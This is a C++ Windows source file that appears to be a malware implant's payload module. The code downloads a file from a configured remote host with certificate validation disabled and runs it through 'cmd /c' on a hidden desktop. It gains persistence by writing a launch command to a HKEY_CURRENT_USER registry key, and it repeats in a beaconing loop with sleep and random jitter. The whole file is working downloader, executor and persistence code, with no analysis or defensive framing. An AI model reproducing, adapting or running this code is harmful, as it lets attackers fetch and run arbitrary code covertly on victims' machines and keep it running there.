#include <payload.h>
#include <config.h>
#ifdef DEBUG
#include <iostream>
#include <ostream>
#endif

bool ShellExec(const char *cmd)
{
		char *fullcmd = new char[strlen(cmd) + 0x10]();
		sprintf(fullcmd, "cmd /c %s", cmd);
		HDESK newdesktop = OpenDesktopA((char *)DESKTOP_NAME, 0, FALSE, GENERIC_ALL);
		if(!newdesktop) {
				newdesktop = CreateDesktopA((char *)DESKTOP_NAME, NULL, NULL, 0, GENERIC_ALL, NULL);
		}
		PROCESS_INFORMATION process;
		STARTUPINFOA startup;
		HANDLE h = NULL, h_w = NULL;
		ZeroMemory((char *) &process, sizeof(PROCESS_INFORMATION));
		ZeroMemory((char *) &startup, sizeof(STARTUPINFO));
		startup.cb = sizeof(STARTUPINFO);
		startup.lpDesktop = (char *)DESKTOP_NAME;
		if (CreateProcessA(NULL, fullcmd, 0, 0, TRUE, 0, 0, 0, &startup, &process) ==  0)
		{
#ifdef DEBUG
				std::cout << "failed to execute: " << cmd << " error=" << GetLastError() << std::endl;
#endif
				CloseHandle(h);
				CloseHandle(h_w);
				CloseDesktop(newdesktop);
				delete fullcmd;
				return false;
		}
		delete fullcmd;
		return true;
}

bool DownloadToFile(wchar_t * hostname, wchar_t *url, const char *destfile, bool https=true, DWORD port=443)
{
	HINTERNET s_internet, s_connectionHandle, s_requestHandle;
	DWORD useragentlen = 4096;
	char *useragentA = new char[useragentlen];
	wchar_t *useragentW = new wchar_t[useragentlen];
	ObtainUserAgentString(0, useragentA, &useragentlen);
	mbstowcs(useragentW, useragentA, useragentlen);
	delete useragentA;
	s_internet = WinHttpOpen(useragentW, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	delete useragentW;
	s_connectionHandle = WinHttpConnect(s_internet, hostname, port, 0);
	if (!s_connectionHandle) {
#ifdef DEBUG
		std::cout << "WinHttpOpen failed: " << GetLastError() << std::endl;
#endif
			return FALSE;
	}
	if(https) {
		s_requestHandle = WinHttpOpenRequest(s_connectionHandle, L"GET", url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE|WINHTTP_FLAG_REFRESH);
	} else {
		s_requestHandle = WinHttpOpenRequest(s_connectionHandle, L"GET", url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
	}
	if(!s_requestHandle) {
		WinHttpCloseHandle(s_connectionHandle);
		WinHttpCloseHandle(s_internet);
#ifdef DEBUG
		std::cout << "HttpOpenRequest failed: " << GetLastError() << std::endl;
#endif
		return FALSE;
	}
	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
	if(!WinHttpSetOption(s_requestHandle, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
		WinHttpCloseHandle(s_requestHandle);
		WinHttpCloseHandle(s_connectionHandle);
		WinHttpCloseHandle(s_internet);
#ifdef DEBUG
		std::cout << "WinHttpSetOption failed: " << GetLastError() << std::endl;
#endif
		return FALSE;
	}
	if(!WinHttpSendRequest(s_requestHandle, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, WINHTTP_IGNORE_REQUEST_TOTAL_LENGTH, (DWORD_PTR)NULL)) {
		WinHttpCloseHandle(s_requestHandle);
		WinHttpCloseHandle(s_connectionHandle);
		WinHttpCloseHandle(s_internet);
#ifdef DEBUG
		std::wcout << L"HttpSendRequest to: " << host << url << L" failed: " << GetLastError() << std::endl;
#endif
		return FALSE;
	}
	WinHttpReceiveResponse(s_requestHandle, NULL);
	char *fulldestfile = new char[4096];
	ExpandEnvironmentStringsA(destfile, fulldestfile, 4096);
	DWORD Read = 1;
	FILE* filefd = fopen(fulldestfile, "wb");
	while(Read > 0) {
		WinHttpQueryDataAvailable(s_requestHandle, &Read);
		char *buffer = new char[Read];
		if(Read == 0) break;
		if(filefd == NULL) {
			WinHttpCloseHandle(s_requestHandle);
			WinHttpCloseHandle(s_connectionHandle);
			WinHttpCloseHandle(s_internet);
			delete buffer;
			delete fulldestfile;
			fclose(filefd);
			DeleteFile(fulldestfile);
#ifdef DEBUG
			std::wcout << L"fopen(" << fulldestfile << L") failed: " << GetLastError() << std::endl;
#endif
			return FALSE;
		}
		if(!WinHttpReadData(s_requestHandle, buffer, Read, &Read)) {
			WinHttpCloseHandle(s_requestHandle);
			WinHttpCloseHandle(s_connectionHandle);
			WinHttpCloseHandle(s_internet);
			delete fulldestfile;
			delete buffer;
			fclose(filefd);
			DeleteFile(fulldestfile);
#ifdef DEBUG
			std::wcout << L"WinHttpReadData to: " << host << url << L" failed: " << GetLastError() << std::endl;
#endif
			return FALSE;
		}
		fwrite(buffer, Read, 1, filefd);
		delete buffer;
	}
	delete fulldestfile;
	fclose(filefd);
	WinHttpCloseHandle(s_requestHandle);
	WinHttpCloseHandle(s_connectionHandle);
	WinHttpCloseHandle(s_internet);
	return TRUE;
}

bool install(void)
{
	bool status = FALSE;
	HKEY hKey;
	DWORD Disposition;
	if (RegCreateKeyExW(HKEY_CURRENT_USER, INSTALL_DEST, 0, NULL, 0, KEY_WRITE|KEY_READ, NULL, &hKey, &Disposition) == ERROR_SUCCESS) {
			status = RegSetValueExA(hKey, KEY_NAME, 0, REG_SZ, (BYTE *)LAUNCH_CMD, strlen(LAUNCH_CMD));
			RegCloseKey(hKey);
	}
	return status;
}

uint32_t payload(void *lpParameter)
{
	srand(time(NULL));//not crypto, don't care.
	while(true) {
		if(DownloadToFile(HOSTNAME, URL, DESTFILE)) {
			Sleep(60 * 1000);
			ShellExec(LAUNCH_CMD);
			Sleep(60 * 1000);
			install();
		}
		Sleep(1000 * SLEEPTIME);
		Sleep(1000* rand() % JITTER);
	}
	ExitThread(0);
	return 0;
}
